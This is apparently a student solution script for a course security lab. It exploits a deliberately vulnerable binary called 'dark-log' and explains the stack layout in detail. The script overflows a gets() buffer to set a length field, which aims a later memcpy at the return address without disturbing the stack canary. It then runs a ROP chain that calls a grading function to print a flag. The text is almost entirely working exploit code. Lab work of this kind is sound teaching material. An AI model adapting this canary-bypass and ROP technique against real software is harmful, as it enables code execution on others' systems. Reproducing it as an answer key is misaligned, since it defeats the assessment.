#!/usr/bin/env python3
"""Lab 3 / Task 4 -- attack/dark-log: bypass the stack canary.

dark-log is non-PIE and NX, and ``input()`` is compiled with
``-fstack-protector``.  Its frame is a struct:

    rbp-0x120   char expression[128]   (gets() destination)
    rbp-0x0a0   char logMsg[128]
    rbp-0x020   int  len               (f.len)
    rbp-0x01c   char pad[8]
    rbp-0x008   canary        <-- checked before leave/ret
    rbp         saved RBP
    rbp+8       return address

The bug is that ``f.len`` is attacker-controlled.  A plain overflow cannot
reach the return address without destroying the canary, but the code then does
``memcpy(f.logMsg + f.len, f.expression, 128)`` -- a *second* write whose
destination depends on our data.  So:

  * gets() writes only up to offset 0x103, i.e. it stops right after the 4-byte
    ``len`` field and never touches the canary at offset 0x118;
  * we set len = 0xa0, so memcpy() writes 128 bytes to
    rbp-0xa0+0xa0 = rbp, i.e. to the saved RBP and the return address, while
    the canary (rbp-8) is left untouched -> the check passes;
  * the first 128 bytes of our input are the ROP chain, and every 8-byte
    address contains no 0x0a byte, so gets() is happy.

Gadgets: 0x4018a4 ret, 0x4018a3 pop rdi; ret (misaligned 41 5f c3),
0x401677 grade_eval, 0x401590 _start.  dark-log does not import exit(3), so
after grade_eval returns we jump back to ``_start``.  __libc_start_main runs
main() once more; stdin is already at EOF, so input() returns immediately,
main prints "Log saved." and returns 0, and the process exits cleanly.  The
flag line has already been flushed to stdout by grade_eval anyway.
"""
import struct
import sys

GRADE_EVAL = 0x401677
POP_RDI    = 0x4018A3   # 5f c3  ->  pop rdi ; ret
RET        = 0x4018A4   # plain `ret`
START      = 0x401590   # _start: re-enter __libc_start_main -> main() -> exit(0)
LEN_OFFSET = 0x100      # offset of f.len inside the gets() buffer
LEN_VALUE  = 0xA0       # memcpy destination = logMsg + 0xa0 = saved RBP


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def main() -> None:
    chain = b""
    chain += p64(0)             # new RBP (value written over saved RBP)
    chain += p64(RET)           # alignment slide
    chain += p64(POP_RDI)       # rdi = 4
    chain += p64(4)
    chain += p64(GRADE_EVAL)    # grade_eval(4) -> prints the flag
    chain += p64(START)         # _start; stdin is at EOF, so main exits 0
    assert len(chain) == 48

    payload = chain
    payload += b"C" * (LEN_OFFSET - len(payload))   # filler inside logMsg[128]
    payload += struct.pack("<I", LEN_VALUE)         # overwrite f.len
    payload += b"\n"                                # ends gets()

    assert LEN_OFFSET + 4 + 1 <= 0x118   # canary starts at offset 0x118
    assert b"\x0a" not in payload[:-1]
    sys.stdout.buffer.write(payload)


if __name__ == "__main__":
    main()
